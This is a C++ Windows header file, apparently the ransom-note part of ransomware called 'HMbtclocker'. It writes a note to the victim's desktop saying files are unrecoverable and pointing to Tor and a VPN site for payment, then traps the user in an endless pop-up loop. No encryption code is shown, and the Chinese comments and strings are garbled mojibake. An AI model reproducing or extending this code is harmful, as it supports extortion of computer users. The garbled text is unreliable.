#pragma once
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <shlobj.h>

// ��ȡ����·��
std::wstring getDesktopPath() {
    wchar_t desktopPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath))) {
        return std::wstring(desktopPath);
    }
    return L"";
}

// ��װ��Ҫ���ܵ�һ������
void createTxtAndShowMessage() {
    // ��ȡ����·��
    SetConsoleOutputCP(CP_UTF8);
    std::wstring desktopPath = getDesktopPath();
    if (desktopPath.empty()) {
        std::wcout << L"�޷���ȡ����·��" << std::endl;
        return;
    }

    // ƴ���ļ���
    std::wstring filePath = desktopPath + L"\\myFile.txt";

    // Ԥ����ļ�����
    std::wstring fileContent = L"����ļ��ѱ�����\n"
        L"���������������tor������������վ��\n"
        L"��װtor��Ҫvpn,ikuuu.one��һ��vpn��վ��֮������torproject.org������tor\n"
        L"����ļ����޷��ָ��ģ�����֧������\n"
        L"HMbtclocker��ӭ���ʹ��\n"
        L"������ļ����ݱ�ø��ӷḻ������\n";

    // ������д���ļ�
    std::wofstream outFile(filePath);
    if (!outFile.is_open()) {
        std::wcout << L"�޷����ļ� " << filePath << std::endl;
        return;
    }
    outFile << fileContent;
    outFile.close();

    // Ԥ��ĵ�������

    std::wstring messageBoxContent = L"����ļ��ѱ�����,���������������tor������������վ����װtor��Ҫvpn,ikuuu.one��һ��vpn��վ��֮������torproject.org������tor ����ļ����޷��ָ��ģ�����֧������ HMbtclocker��ӭ���ʹ��,tor������վ��ַΪ��";
    while (1) {
        MessageBoxW(NULL, messageBoxContent.c_str(), L"��ʾ", MB_OK);
    }
    // ������Ϣ��

}


